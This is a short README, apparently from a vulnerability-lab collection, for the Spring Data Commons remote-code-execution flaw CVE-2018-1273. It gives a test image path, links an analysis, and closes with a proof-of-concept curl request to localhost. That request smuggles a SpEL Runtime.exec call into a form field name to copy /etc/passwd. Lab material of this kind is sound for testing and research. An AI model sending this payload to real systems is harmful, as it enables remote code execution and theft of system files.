@@ -1,0 +1,16 @@
+## CVE-2018-1273: RCE with Spring Data Commons
+
+测试镜像
+
+* src/spring-data-commons/2.0.3/
+
+参考链接
+
+* [【漏洞分析】CVE-2018-1273: RCE with Spring Data Commons 分析报告](http://blog.nsfocus.net/cve-2018-1273-analysis/)
+
+Poc
+
+```
+curl http://127.0.0.1/users --data 'username[T(java.lang.Runtime).getRuntime().exec("cp /etc/passwd /tmp")/abc]=123&password=123&repeatedPassword=123'
+```
+
